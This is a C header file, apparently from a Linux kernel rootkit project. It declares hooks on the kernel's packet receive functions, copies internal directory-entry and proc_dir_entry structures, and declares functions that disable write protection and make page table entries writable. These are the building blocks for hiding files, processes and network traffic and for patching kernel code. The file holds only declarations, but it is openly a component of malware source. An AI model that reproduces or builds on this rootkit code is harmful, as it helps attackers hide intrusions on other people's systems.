#ifndef INCLUDE_HEADER
#define INCLUDE_HEADER

#include <linux/module.h>
#include <linux/types.h>
#include <linux/kobject.h>
#include <net/tcp.h>
#include <net/udp.h>

#include "sysmap.h"

/* some macros */
#ifdef DEBUG
#define ROOTKIT_DEBUG(...) printk(KERN_INFO __VA_ARGS__)
#else
#define ROOTKIT_DEBUG(...)
#endif

#define KFUN(name) fn_##name = (void*) rk_##name

extern int (*fn_packet_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*);
extern int (*fn_packet_rcv_spkt)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*);
extern int (*fn_tpacket_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*);

/* dirent structure */
struct linux_dirent {   
        unsigned long   d_ino;   
        unsigned long   d_off;   
        unsigned short  d_reclen;   
        char            d_name[1];   
};

/* since this struct is no longer available in proc_fs, taken from fs/proc/internal.h */
struct proc_dir_entry {
          unsigned int low_ino;
          umode_t mode;
          nlink_t nlink;
          kuid_t uid;
          kgid_t gid;
          loff_t size;
          const struct inode_operations *proc_iops;
          const struct file_operations *proc_fops;
          struct proc_dir_entry *next, *parent, *subdir;
          void *data;
          atomic_t count;	/* use count */
          atomic_t in_use;	/* number of callers into module in progress; */
				/* negative -> it's going away RSN */
          struct completion *pde_unload_completion;
          struct list_head pde_openers;   /* who did ->open, but not ->release */
          spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
          u8 namelen;
          char name[];
};

void disable_page_protection (void);

void enable_page_protection (void);

ssize_t get_path(unsigned int fd, char *path, size_t bufsiz);

unsigned long set_addr_rw(unsigned long);
void set_pte_permissions(unsigned long,int);

#endif
